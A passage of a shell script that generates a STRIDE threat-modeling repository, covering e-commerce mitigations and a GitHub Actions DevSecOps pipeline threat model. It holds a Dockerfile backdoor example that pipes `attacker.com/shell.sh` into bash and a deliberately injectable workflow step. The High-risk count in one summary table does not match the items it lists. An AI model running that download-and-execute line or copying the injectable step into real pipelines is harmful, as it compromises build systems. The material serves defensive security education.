| Critical | 4 | Price manipulation, admin compromise, public S3 bucket, IDOR, JWT manipulation |
| High | 10 | Credential stuffing, JWT replay, DDoS, Redis exposure, SSRF to PCI zone |
| Medium | 9 | Cache poisoning, queue injection, log PII leakage, search DoS |
| Low | 0 | |
ENDOFFILE

cat > "$REPO_DIR/models/enterprise-ecommerce/mitigations.md" << 'ENDOFFILE'
# Mitigations: SecureCart E-Commerce Platform

Controls grouped by architectural layer. Each mitigation references the threat IDs it addresses.

## Layer 1: Edge / Perimeter

### M-1: Enforce TLS everywhere
**Addresses:** T-2
**Controls:** TLS 1.2+ on all endpoints. HSTS header with `max-age=31536000; includeSubDomains; preload`. Certificate pinning on mobile clients. Redirect all HTTP to HTTPS.

### M-2: DDoS protection and rate limiting
**Addresses:** D-1, D-3, S-1
**Controls:** AWS Shield Standard (free) or Advanced (managed). CloudFront as the CDN layer absorbs volumetric attacks. API Gateway enforces per-IP and per-API-key rate limits. Auth endpoints get stricter limits (5 attempts/minute per account).

### M-3: Web Application Firewall
**Addresses:** D-2, T-1
**Controls:** AWS WAF rules on CloudFront and API Gateway. Block SQL injection patterns, oversized payloads, and known malicious IPs. Custom rules for application-specific attack patterns.

## Layer 2: Authentication and Authorization

### M-4: Multi-factor authentication
**Addresses:** S-1, S-3
**Controls:** TOTP or WebAuthn required for all admin accounts. Optional (encouraged) for customer accounts. MFA step-up for sensitive operations (password change, payment method change).

### M-5: Secure JWT implementation
**Addresses:** S-2, E-2
**Controls:** RS256 signing (asymmetric keys). 15-minute access token expiry. Refresh tokens stored server-side with binding to device fingerprint. Validate `exp`, `iss`, `aud`, and `sub` on every request. Maintain a Redis-backed revocation list for logout and compromise scenarios.

### M-6: Authorization enforcement (IDOR prevention)
**Addresses:** E-1
**Controls:** Every data access validates that the authenticated user owns the requested resource. Middleware pattern: `authorize(user_id, resource_id, action)` on every endpoint. Never trust client-supplied user identifiers for authorization decisions.

### M-7: IdP integration hardening
**Addresses:** S-5
**Controls:** Pin IdP signing certificate. Validate SAML assertion signatures and OIDC token claims. Reject unsigned or weakly signed assertions. Audit IdP configuration changes.

## Layer 3: Application Services

### M-8: Server-side price validation
**Addresses:** T-1
**Controls:** Cart total calculated server-side from the product catalog at checkout time. Client-submitted prices are ignored. Final amount compared against payment processor charge. Alert on discrepancies.

### M-9: Input validation and output encoding
**Addresses:** D-2, E-4, I-3
**Controls:** Validate all input against strict schemas (type, length, format) at the API Gateway and at each service. Use parameterized queries for all database operations. Return generic error messages to clients; log details server-side.

### M-10: Service-to-service authentication
**Addresses:** S-4
**Controls:** Mutual TLS between services. Service mesh (Istio/Linkerd) manages certificate issuance and rotation. Each service has a unique identity. Network policies restrict which services can communicate.

### M-11: SSRF prevention
**Addresses:** E-3
**Controls:** Block outbound HTTP requests to RFC 1918 addresses and link-local ranges. Allow-list external domains each service can reach. Payment Service has no outbound HTTP capability except to Stripe's documented endpoints.

### M-12: Queue security
**Addresses:** T-5, D-4
**Controls:** Authenticate queue producers with service credentials. HMAC-sign messages so consumers verify origin. Set queue depth limits and dead-letter queue for unprocessable messages. Monitor queue depth for anomalies.

## Layer 4: Data

### M-13: Database encryption and access control
**Addresses:** I-6, E-4
**Controls:** RDS encryption at rest with customer-managed KMS key. One database user per service with least-privilege grants. Enable audit logging for all DDL and privileged operations. Restrict security group to application subnet.

### M-14: Redis hardening
**Addresses:** I-4, T-4
**Controls:** Enable Redis AUTH with a strong password from secrets manager. Enable TLS in transit. Restrict security group to application subnet. Set `maxmemory` and eviction policy. Use separate Redis instances for sessions vs. cache.

### M-15: S3 bucket hardening
**Addresses:** I-2, T-3
**Controls:** Enable S3 Block Public Access at the account level. Use bucket policies that deny `s3:GetObject` except via pre-signed URLs or CloudFront OAI. Enable versioning and access logging. Encrypt with SSE-S3 or SSE-KMS.

### M-16: PII handling in logs
**Addresses:** I-5
**Controls:** Structured logging with a PII scrubbing filter that redacts email addresses, phone numbers, and partial card numbers. Never log authorization headers, tokens, or credentials. Log aggregation access restricted to security and SRE teams.

## Layer 5: Operations and Governance

### M-17: Audit logging
**Addresses:** R-1, R-2, R-3
**Controls:** All authentication events, admin actions, and payment operations logged with: actor identity, timestamp (UTC), action, resource, and outcome. Logs shipped to immutable storage (CloudWatch Logs with retention lock or S3 with Object Lock). Reconcile payment logs against Stripe weekly.

### M-18: Secrets management
**Addresses:** I-1 (general principle)
**Controls:** All secrets (database credentials, API keys, signing keys) stored in AWS Secrets Manager or HashiCorp Vault. Rotated on schedule (90 days for API keys, 30 days for database passwords). No secrets in source code, environment files, or container images.

### M-19: Incident response preparation
**Controls:** Documented runbooks for credential compromise, data breach, and DDoS. Automated alerting on: failed login spikes, unusual data export volumes, payment failure rate increase, and security group changes.

## Control Coverage Matrix

| Threat ID | Mitigation(s) | Layer |
|-----------|--------------|-------|
| S-1 | M-2, M-4 | Edge, Auth |
| S-2 | M-5 | Auth |
| S-3 | M-4, M-17 | Auth, Ops |
| S-4 | M-10 | App |
| S-5 | M-7 | Auth |
| T-1 | M-3, M-8 | Edge, App |
| T-2 | M-1 | Edge |
| T-3 | M-15 | Data |
| T-4 | M-14 | Data |
| T-5 | M-12 | App |
| R-1 | M-17 | Ops |
| R-2 | M-17 | Ops |
| R-3 | M-17 | Ops |
| I-1 | M-9 | App |
| I-2 | M-15 | Data |
| I-3 | M-9 | App |
| I-4 | M-14 | Data |
| I-5 | M-16 | Ops |
| I-6 | M-13 | Data |
| D-1 | M-2, M-3 | Edge |
| D-2 | M-3, M-9 | Edge, App |
| D-3 | M-2 | Edge |
| D-4 | M-12 | App |
| E-1 | M-6 | Auth |
| E-2 | M-5 | Auth |
| E-3 | M-10, M-11 | App |
| E-4 | M-9, M-13 | App, Data |

Every identified threat has at least one mapped control. No threat is accepted without mitigation in this model.
ENDOFFILE

echo "  ✓ Enterprise E-Commerce model"

# ────────────────────────────────────────────
# CI/CD Pipeline
# ────────────────────────────────────────────

cat > "$REPO_DIR/models/ci-cd-pipeline/README.md" << 'ENDOFFILE'
# Threat Model: GitHub Actions DevSecOps Pipeline

**System:** CI/CD security scanning pipeline built on GitHub Actions
**Date:** October 2026
**Methodology:** STRIDE

## System Overview

This threat model covers a GitHub Actions-based DevSecOps pipeline that automates security scanning across five stages: secrets detection, static analysis (SAST), software composition analysis (SCA), container image scanning, and dynamic application security testing (DAST). The pipeline runs on every push and pull request, uploads SARIF results to GitHub's Security tab, and is designed for a small team shipping a containerized Python/Flask application.

### Architecture

| Component | Technology | Description |
|-----------|-----------|-------------|
| Source Repository | GitHub | Hosts application code, Dockerfile, workflow definitions, and requirements files |
| Workflow Engine | GitHub Actions | Orchestrates the five-stage pipeline on `ubuntu-latest` runners |
| Secrets Store | GitHub Secrets | Stores API keys for third-party scanners (e.g. `SNYK_TOKEN`) |
| Stage 1 — Secrets Scan | Gitleaks | Scans commit history and working tree for hardcoded secrets |
| Stage 2 — SAST | Semgrep | Static analysis for injection flaws, insecure patterns, and code quality |
| Stage 3 — SCA | Snyk CLI | Checks Python dependencies against known vulnerability databases |
| Stage 4 — Container Scan | Trivy (Aqua) | Scans the built Docker image for OS-package and library vulnerabilities |
| Stage 5 — DAST | OWASP ZAP | Runs an active/passive scan against the live containerized application |
| Results Aggregation | GitHub Security Tab | Collects SARIF uploads from each stage into a unified code scanning view |
| Artifact Storage | GitHub Actions Artifacts | Stores scan reports (SARIF, HTML, JSON) for download and review |

### Data Classification

| Data Type | Classification | Handling |
|-----------|---------------|----------|
| Application source code | Confidential | Checked out on ephemeral runner; never persists beyond job |
| Scanner API tokens (SNYK_TOKEN) | Secret | Stored in GitHub Secrets; injected as environment variables at runtime |
| SARIF scan results | Internal | Uploaded to GitHub Security tab; may contain file paths and code snippets |
| Docker image layers | Internal | Built and scanned in-job; pushed to registry only if a deploy stage exists |
| Workflow definition files | Internal | YAML files in `.github/workflows/`; changes trigger pipeline runs |
| Runner environment metadata | Internal | OS version, installed packages, network config; ephemeral but observable during job |

### Pipeline Flow

```
Push / PR
  │
  ├─► Stage 1: Gitleaks (secrets scan)
  ├─► Stage 2: Semgrep (SAST)
  ├─► Stage 3: Snyk (SCA)
  ├─► Stage 4: Trivy (container scan) ──► Docker build
  └─► Stage 5: ZAP (DAST) ──► Docker build + run ──► active scan
  │
  └─► SARIF uploads ──► GitHub Security Tab
```
ENDOFFILE

cat > "$REPO_DIR/models/ci-cd-pipeline/data-flow-diagram.md" << 'ENDOFFILE'
# Data Flow Diagrams: GitHub Actions DevSecOps Pipeline

## Level 0 — Context Diagram

```mermaid
flowchart LR
    Dev([Developer])
    Pipeline[DevSecOps Pipeline]
    GitHub([GitHub Platform])
    Snyk([Snyk API])
    Registry([Container Registry])

    Dev -->|Push code,\nopen PR| GitHub
    GitHub -->|Trigger workflow| Pipeline
    Pipeline -->|Upload SARIF,\nartifacts| GitHub
    Pipeline -->|Dependency\nvulnerability check| Snyk
    Pipeline -->|Pull base images| Registry
    GitHub -->|Scan results,\nalerts| Dev
```

## Level 1 — Pipeline Detail with Trust Boundaries

```mermaid
flowchart TB
    subgraph TB_Dev["Trust Boundary: Developer Workstation"]
        Dev([Developer])
        LocalGit[Local Git Repo]
    end

    subgraph TB_GitHub["Trust Boundary: GitHub Platform"]
        Repo[Source Repository]
        Secrets[GitHub Secrets]
        SecurityTab[Security Tab\nCode Scanning]
        ArtifactStore[Actions Artifacts]
        ActionsEngine[Actions Workflow Engine]
    end

    subgraph TB_Runner["Trust Boundary: Ephemeral Runner (ubuntu-latest)"]
        Checkout[actions/checkout]

        subgraph Stage1["Stage 1"]
            Gitleaks[Gitleaks Scanner]
        end
        subgraph Stage2["Stage 2"]
            Semgrep[Semgrep Scanner]
        end
        subgraph Stage3["Stage 3"]
            SnykCLI[Snyk CLI]
        end
        subgraph Stage4["Stage 4"]
            DockerBuild4[Docker Build]
            Trivy[Trivy Scanner]
        end
        subgraph Stage5["Stage 5"]
            DockerBuild5[Docker Build + Run]
            ZAP[OWASP ZAP]
        end

        SARIFUpload[SARIF Upload Action]
    end

    subgraph TB_External["Trust Boundary: Third-Party Services"]
        SnykAPI([Snyk Vulnerability DB])
        DockerHub([Docker Hub / Registry])
        SemgrepRegistry([Semgrep Rules Registry])
        GitHubMarketplace([Actions Marketplace])
    end

    Dev -->|git push| LocalGit
    LocalGit -->|Push over HTTPS| Repo
    Repo -->|Webhook trigger| ActionsEngine
    ActionsEngine -->|Provision runner,\ninject secrets| Checkout
    Secrets -->|SNYK_TOKEN,\nGITHUB_TOKEN| Checkout

    Checkout -->|Source code| Gitleaks
    Checkout -->|Source code| Semgrep
    Checkout -->|requirements.txt| SnykCLI
    Checkout -->|Dockerfile + source| DockerBuild4
    Checkout -->|Dockerfile + source| DockerBuild5

    Semgrep -->|Fetch rules| SemgrepRegistry
    SnykCLI -->|API call with token| SnykAPI
    DockerBuild4 -->|Pull base image| DockerHub
    DockerBuild5 -->|Pull base image| DockerHub
    DockerBuild4 -->|Built image| Trivy
    DockerBuild5 -->|Running container| ZAP

    Gitleaks -->|SARIF| SARIFUpload
    Semgrep -->|SARIF| SARIFUpload
    SnykCLI -->|SARIF| SARIFUpload
    Trivy -->|SARIF| SARIFUpload
    ZAP -->|SARIF| SARIFUpload

    SARIFUpload -->|Upload results| SecurityTab
    SARIFUpload -->|Upload reports| ArtifactStore
    SecurityTab -->|Alerts| Dev
```

## Trust Boundaries

| Boundary | Components Inside | Rationale |
|----------|------------------|-----------|
| Developer Workstation | Local git repo, IDE, credentials | Trusted but outside platform control. Compromised workstation can push malicious code or steal credentials. |
| GitHub Platform | Repository, Secrets store, Actions engine, Security tab, Artifacts | Managed SaaS. Trust depends on GitHub's security posture and the org's configuration (branch protections, secret scoping). |
| Ephemeral Runner | Checkout action, all five scanner stages, SARIF upload | Provisioned per-job and destroyed after. Shares the runner image with other GitHub users. Code and third-party actions execute here with access to injected secrets. |
| Third-Party Services | Snyk API, Docker Hub, Semgrep rules registry, Actions Marketplace | External services accessed over HTTPS. Supply chain risk: a compromised action, base image, or rule set can inject malicious code into the pipeline. |

## Critical Data Flows

| # | Flow | Source | Destination | Data | Trust Boundary Crossing |
|---|------|--------|-------------|------|------------------------|
| DF-1 | Code push | Developer workstation | GitHub repository | Source code, Dockerfile, workflow YAML | Dev → GitHub |
| DF-2 | Runner provisioning | GitHub Actions engine | Ephemeral runner | Runner image, environment variables, secrets | GitHub → Runner |
| DF-3 | Code checkout | GitHub repository | Runner filesystem | Full repository contents | GitHub → Runner |
| DF-4 | Dependency check | Snyk CLI on runner | Snyk API | requirements.txt contents, SNYK_TOKEN | Runner → External |
| DF-5 | Base image pull | Docker daemon on runner | Docker Hub | Container base image layers | External → Runner |
| DF-6 | Rule fetch | Semgrep on runner | Semgrep registry | Scanning rule definitions | External → Runner |
| DF-7 | SARIF upload | Scanner stages on runner | GitHub Security tab | Scan results (file paths, line numbers, findings) | Runner → GitHub |
| DF-8 | Artifact upload | Scanner stages on runner | GitHub Artifacts | Full scan reports (HTML, JSON) | Runner → GitHub |
| DF-9 | Action resolution | Workflow YAML | Actions Marketplace / repos | Third-party action code | External → Runner |
ENDOFFILE

cat > "$REPO_DIR/models/ci-cd-pipeline/threat-analysis.md" << 'ENDOFFILE'
# STRIDE Threat Analysis: GitHub Actions DevSecOps Pipeline

## Spoofing

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| S-1 | GitHub repository | Attacker compromises a developer's GitHub credentials or personal access token and pushes malicious code or workflow changes. | High | Enforce MFA on all GitHub accounts. Require SSO where available. Use short-lived tokens over long-lived PATs. |
| S-2 | Third-party actions | Attacker publishes a typosquatted action (e.g. `actions/checkout` vs `acti0ns/checkout`) or compromises an existing action's repository and pushes a backdoored version. | Critical | Pin actions to full commit SHAs, not tags. Audit action sources before adoption. Restrict to actions from verified creators or an internal allow-list. |
| S-3 | Snyk API | Attacker intercepts or replays the SNYK_TOKEN to impersonate the organization's Snyk account, potentially suppressing known vulnerabilities or exfiltrating dependency data. | Medium | Rotate tokens on a schedule. Scope tokens to the minimum required permissions. Monitor Snyk audit logs for anomalous API usage. |
| S-4 | Docker Hub | Attacker pushes a compromised base image under a trusted tag (tag mutability). The pipeline pulls a malicious image believing it to be the expected one. | High | Pin base images by digest (`python:3.11@sha256:abc...`), not by mutable tag. Use a private registry mirror with signature verification. |

## Tampering

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| T-1 | Workflow YAML | Attacker with write access modifies `.github/workflows/*.yml` to skip security stages, exfiltrate secrets, or inject malicious build steps. | Critical | Require pull request reviews for workflow file changes. Use CODEOWNERS to restrict who can approve workflow modifications. Enable branch protection on main. |
| T-2 | SARIF results | Attacker modifies SARIF output on the runner before upload, suppressing critical findings so they never appear in the Security tab. | Medium | Validate SARIF schema before upload. Compare finding counts against baseline. Alert on unexpected drops in finding count between runs. |
| T-3 | Dependency manifest | Attacker submits a PR that adds a malicious dependency to `requirements.txt` or pins a known-vulnerable version. The SCA stage may not flag it if the vulnerability isn't yet in the database (zero-day in a dependency). | High | Require review for dependency changes. Use Dependabot or Renovate for automated updates. Cross-reference multiple vulnerability databases. |
| T-4 | Docker build | Attacker modifies the Dockerfile to add a backdoor (e.g. `curl attacker.com/shell.sh | bash`) in a layer that executes at build time. Build-time commands run with full runner network access. | High | Review Dockerfile changes in PRs. Lint Dockerfiles with hadolint. Restrict runner outbound network access where possible. |
| T-5 | Semgrep rules | If custom Semgrep rules are loaded from the repository, an attacker can modify them to whitelist vulnerable patterns, making SAST blind to real issues. | Medium | Store custom rules in a separate, protected repository. Pin the Semgrep rules config to a specific version or commit. Review rule changes independently. |

## Repudiation

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| R-1 | Workflow runs | A developer claims they did not trigger a workflow run or that the results shown are not from their commit. No immutable link between the commit, the actor, and the scan results. | Medium | GitHub Actions logs include the triggering actor, commit SHA, and run ID. Enable audit log streaming. Require signed commits (GPG/SSH) so authorship is non-repudiable. |
| R-2 | Security findings | A developer dismisses or closes a code scanning alert in the Security tab with no documented justification. The dismissal is not tracked or reviewed. | Medium | Require a reason when dismissing alerts. Periodically audit dismissed findings. Use GitHub's alert dismissal reasons field. Restrict dismiss permissions to security team. |
| R-3 | Secrets access | An administrator modifies or reads a repository secret (e.g. rotates SNYK_TOKEN) with no audit trail showing who made the change and when. | Medium | Use GitHub's audit log for secrets access events. Restrict secrets management to org-level admins. Notify the team on secret rotation via a side channel. |

## Information Disclosure

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| I-1 | GitHub Secrets | Workflow step accidentally logs a secret to stdout (e.g. `echo $SNYK_TOKEN` for debugging). GitHub masks known secrets in logs, but derived values or partial tokens can leak. | High | Never echo secrets. Use `::add-mask::` for any derived value. Review workflow logs periodically. Treat all runner logs as potentially containing secrets. |
| I-2 | SARIF / Artifacts | Scan reports contain file paths, code snippets, and vulnerability details. If the repository is public or artifacts are publicly downloadable, this gives attackers a roadmap. | High | Keep security-sensitive repositories private. Set artifact retention to the minimum needed. Restrict artifact download permissions. |
| I-3 | Fork pull requests | A fork PR triggers a workflow run. If `pull_request_target` is used instead of `pull_request`, the workflow runs with write access and secrets from the base repository, potentially exposing them to the fork author's code. | Critical | Use `pull_request` (not `pull_request_target`) for untrusted code. Never pass secrets to workflows triggered by forks. If `pull_request_target` is required, ensure the untrusted code is never checked out or executed. |
| I-4 | Runner environment | The ephemeral runner environment contains metadata (cloud provider credentials via IMDS, environment variables, network configuration) that a malicious action or build step can exfiltrate. | Medium | Use GitHub-hosted runners (ephemeral, limited IMDS). If self-hosted, harden the runner: restrict network, disable IMDS, run in an isolated VM or container. |
| I-5 | Error output | A scanner crash or misconfiguration dumps a stack trace to the workflow log, revealing internal paths, dependency versions, or partial secret values in memory. | Low | Set `continue-on-error: true` with structured error handling. Sanitize error output. Avoid verbose/debug logging modes in production pipelines. |

## Denial of Service

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| D-1 | GitHub Actions minutes | Attacker opens many PRs or pushes rapidly to consume all available Actions minutes, blocking legitimate pipeline runs. | Medium | Set concurrency groups to cancel redundant runs. Limit which branches and events trigger the pipeline. Use `paths` filters to avoid running on irrelevant changes. |
| D-2 | Runner resources | A malicious or misconfigured scan (e.g. ZAP with no timeout, Trivy scanning an enormous image) exhausts runner CPU, memory, or disk, causing the job to hang or fail. | Medium | Set `timeout-minutes` on every job and step. Limit Docker image size. Configure ZAP scan duration limits. Monitor for long-running jobs. |
| D-3 | Snyk API rate limits | Attacker or misconfigured pipeline floods the Snyk API with requests, hitting rate limits and causing the SCA stage to fail for all subsequent runs. | Low | Cache Snyk results where possible. Rate-limit pipeline triggers. Monitor API usage against quota. |
| D-4 | Security tab flooding | Attacker generates thousands of SARIF findings (e.g. by introducing intentionally vulnerable code), flooding the Security tab and making legitimate findings hard to find. | Medium | Set SARIF upload limits. Alert on abnormal finding count spikes. Require PR review before merge to prevent intentional vulnerability introduction. |

## Elevation of Privilege

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| E-1 | GITHUB_TOKEN permissions | Workflow uses the default `GITHUB_TOKEN` with write permissions. A compromised action step uses the token to push code, create releases, or modify branch protections. | High | Set `permissions` block at the workflow and job level to the minimum required (e.g. `contents: read`, `security-events: write`). Never grant blanket `write-all`. |
| E-2 | Third-party action compromise | A compromised or malicious third-party action executes arbitrary code on the runner with the same permissions as the workflow, including access to all injected secrets. | Critical | Pin actions to commit SHAs. Fork critical actions into the org. Audit action source code. Use a restricted set of approved actions. |
| E-3 | Self-hosted runner persistence | If self-hosted runners are used, a malicious job leaves behind a backdoor process, cron job, or modified tool that persists across workflow runs and affects subsequent jobs. | High | Use ephemeral (GitHub-hosted) runners. If self-hosted runners are required, run each job in a fresh container or VM. Wipe the runner between jobs. |
| E-4 | Workflow injection via PR title/body | An attacker crafts a PR title or body containing a shell command. If the workflow interpolates `${{ github.event.pull_request.title }}` into a `run:` step, the command executes on the runner. | High | Never use `${{ }}` interpolation of untrusted input in `run:` steps. Pass untrusted values as environment variables instead. Validate and sanitize all event-driven inputs. |

## Risk Summary

| Risk Level | Count | Key Items |
|-----------|-------|-----------|
| Critical | 3 | Supply chain via actions (S-2, E-2), `pull_request_target` secret leak (I-3), workflow YAML tampering (T-1) |
| High | 7 | Credential theft (S-1), image tag mutability (S-4), dependency poisoning (T-3), Dockerfile backdoor (T-4), secret logging (I-1), SARIF exposure (I-2), GITHUB_TOKEN over-permission (E-1), runner persistence (E-3), workflow injection (E-4) |
| Medium | 8 | SARIF tampering (T-2), rule manipulation (T-5), repudiation gaps (R-1, R-2, R-3), runner metadata (I-4), Actions minute exhaustion (D-1), runner resource exhaustion (D-2), Security tab flooding (D-4) |
| Low | 2 | Snyk rate limits (D-3), error output leakage (I-5) |
ENDOFFILE

cat > "$REPO_DIR/models/ci-cd-pipeline/mitigations.md" << 'ENDOFFILE'
# Mitigations: GitHub Actions DevSecOps Pipeline

Controls grouped by defense area. Each mitigation references the threat IDs it addresses.

## Area 1: Supply Chain Integrity

### M-1: Pin actions to commit SHAs
**Addresses:** S-2, E-2
**Controls:** Reference every third-party action by its full commit SHA, not a mutable tag. Audit the pinned commit's source before adoption. Fork critical actions into the organization for an additional layer of control.

```yaml
# Vulnerable — tag can be moved to point at a backdoored commit
- uses: actions/checkout@v4

# Fixed — immutable reference
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

### M-2: Pin base images by digest
**Addresses:** S-4
**Controls:** Reference Docker base images by digest rather than mutable tags. Maintain a private registry mirror with image scanning and signature verification.

```dockerfile
# Vulnerable — tag can be overwritten
FROM python:3.11-slim

# Fixed — content-addressable
FROM python:3.11-slim@sha256:abc123...
```

### M-3: Dependency change review
**Addresses:** T-3
**Controls:** Enable Dependabot or Renovate to automate dependency updates with vulnerability context. Require PR reviews for any change to `requirements.txt`, `package.json`, or lockfiles. Cross-reference Snyk, OSV, and GitHub Advisory databases.

## Area 2: Workflow Hardening

### M-4: Protect workflow files with CODEOWNERS and branch protection
**Addresses:** T-1
**Controls:** Add `.github/workflows/` to a CODEOWNERS file requiring security team approval. Enable branch protection on the default branch: require PR reviews, disallow direct pushes, require status checks to pass.

```
# .github/CODEOWNERS
.github/workflows/ @org/security-team
```

### M-5: Minimize GITHUB_TOKEN permissions
**Addresses:** E-1
**Controls:** Set explicit `permissions` at the workflow and job level. Grant only what each job needs — typically `contents: read` and `security-events: write` for a scanning pipeline. Never use the default (often `write-all` for private repos).

```yaml
permissions:
  contents: read
  security-events: write
```

### M-6: Prevent workflow injection
**Addresses:** E-4
**Controls:** Never interpolate event-controlled input (`github.event.pull_request.title`, `github.event.issue.body`, etc.) directly in `run:` blocks. Pass untrusted data through environment variables, which are not subject to shell injection.

```yaml
# Vulnerable
- run: echo "PR title is ${{ github.event.pull_request.title }}"

# Fixed — environment variable is not interpreted as shell code
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

### M-7: Secure fork PR handling
**Addresses:** I-3
**Controls:** Use `pull_request` trigger (not `pull_request_target`) for workflows that run untrusted code. If `pull_request_target` is unavoidable, never checkout the fork's code in the same job that has access to secrets. Use a two-job workflow: one job to check out and build the fork code without secrets, a second job to process results with secrets.

## Area 3: Secrets Protection

### M-8: Prevent secret leakage in logs
**Addresses:** I-1
**Controls:** Never `echo`, `print`, or log any secret or value derived from a secret. Use `::add-mask::` for dynamically generated sensitive values. Periodically review workflow logs for accidental exposure. Treat all runner logs as potentially sensitive.

```yaml
- run: |
    # Mask a derived value
    DERIVED_TOKEN=$(echo "$SNYK_TOKEN" | base64)
    echo "::add-mask::$DERIVED_TOKEN"
```

### M-9: Rotate and scope third-party tokens
**Addresses:** S-3
**Controls:** Rotate SNYK_TOKEN and any other third-party API keys on a defined schedule (e.g. every 90 days). Scope tokens to the minimum permissions needed (read-only vulnerability checks, not org admin). Monitor third-party service audit logs for anomalous usage.

### M-10: Restrict secrets access
**Addresses:** R-3
**Controls:** Scope secrets to specific repositories or environments rather than the entire org. Use environment protection rules to require manual approval for jobs that access production-level secrets. Audit GitHub's org-level audit log for secrets management events.

## Area 4: Runner Security

### M-11: Use ephemeral runners
**Addresses:** E-3, I-4
**Controls:** Use GitHub-hosted runners (ephemeral by default). If self-hosted runners are required, configure them as ephemeral (`--ephemeral` flag) so each job gets a clean instance. Run self-hosted runners inside containers or VMs that are destroyed after each job.

### M-12: Set resource limits on jobs
**Addresses:** D-2
**Controls:** Set `timeout-minutes` on every job and on long-running steps (ZAP scans, large image builds). Limit Docker image size where practical. Configure scanner-specific timeouts (ZAP `cmd_options: -T 300`, Trivy `--timeout`).

```yaml
jobs:
  container-scan:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Trivy scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: image
          timeout: 10m
```

### M-13: Dockerfile linting
**Addresses:** T-4
**Controls:** Add a hadolint step that runs before the Docker build. Flag `curl | sh` patterns, `RUN` commands that download external scripts, and use of `--privileged`. Review Dockerfile changes in PRs with the same rigor as application code.

## Area 5: Results Integrity and Auditability

### M-14: Protect scan results
**Addresses:** T-2, I-2
**Controls:** Validate SARIF schema before upload. Compare finding counts against the previous run and alert on significant decreases. Keep the repository private or restrict artifact download permissions. Set artifact retention to the minimum useful period.

### M-15: Signed commits
**Addresses:** R-1
**Controls:** Require GPG or SSH signed commits via branch protection. This creates a non-repudiable link between the developer identity and the code that triggered the pipeline run.

### M-16: Alert dismissal governance
**Addresses:** R-2
**Controls:** Require a reason when dismissing code scanning alerts. Restrict alert dismissal to the security team via GitHub's code scanning alert permissions. Audit dismissed alerts on a regular cadence.

## Area 6: Availability

### M-17: Pipeline trigger controls
**Addresses:** D-1, D-4
**Controls:** Use `concurrency` groups to cancel superseded runs. Filter triggers with `paths` and `branches` so irrelevant changes don't consume minutes. Set PR labels or environment gates for expensive scan stages.

```yaml
concurrency:
  group: security-pipeline-${{ github.ref }}
  cancel-in-progress: true

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
```

### M-18: Semgrep rule integrity
**Addresses:** T-5
**Controls:** If using custom rules, store them in a separate repository with restricted write access and code review. Pin the `--config` reference to a specific commit or release tag. Diff custom rules against baseline on every change.

## Control Coverage Matrix

| Threat ID | Mitigation(s) | Area |
|-----------|--------------|------|
| S-1 | (GitHub account security — org policy) | — |
| S-2 | M-1 | Supply Chain |
| S-3 | M-9 | Secrets |
| S-4 | M-2 | Supply Chain |
| T-1 | M-4 | Workflow |
| T-2 | M-14 | Results |
| T-3 | M-3 | Supply Chain |
| T-4 | M-13 | Runner |
| T-5 | M-18 | Availability |
| R-1 | M-15 | Results |
| R-2 | M-16 | Results |
| R-3 | M-10 | Secrets |
| I-1 | M-8 | Secrets |
| I-2 | M-14 | Results |
| I-3 | M-7 | Workflow |
| I-4 | M-11 | Runner |
| I-5 | (Operational — structured error handling) | — |
| D-1 | M-17 | Availability |
| D-2 | M-12 | Runner |
| D-3 | (Operational — rate monitoring) | — |
| D-4 | M-17 | Availability |
| E-1 | M-5 | Workflow |
| E-2 | M-1 | Supply Chain |
| E-3 | M-11 | Runner |
| E-4 | M-6 | Workflow |

Note: S-1 (GitHub credential compromise), I-5 (error output leakage), and D-3 (Snyk rate limits) are addressed by organizational policies and operational practices rather than pipeline-specific technical controls. They are included in the threat analysis for completeness and should be covered by the organization's broader security program.
ENDOFFILE

echo "  ✓ CI/CD Pipeline model"

# ────────────────────────────────────────────
# Initialize git repo
# ────────────────────────────────────────────

cd "$REPO_DIR"
git init -b main
git add -A
git commit -m "Initial commit: STRIDE threat models for three systems

- Flask demo app: 15 threats, 11 mitigations (intentionally vulnerable)
- Enterprise e-commerce (SecureCart): 23 threats, 19 mitigations
- CI/CD pipeline: 20 threats, 18 mitigations (supply chain focus)
- STRIDE methodology reference and reusable template"

echo ""
echo "================================================"
echo "  Repository created at: $(pwd)"
echo "================================================"
echo ""
echo "To push to GitHub:"
echo "  cd $(pwd)"
echo "  gh repo create threat-modeling --public --source . --push"
echo ""
echo "Or manually:"
echo "  cd $(pwd)"
echo "  git remote add origin git@github.com:YOUR_USERNAME/threat-modeling.git"
echo "  git push -u origin main"
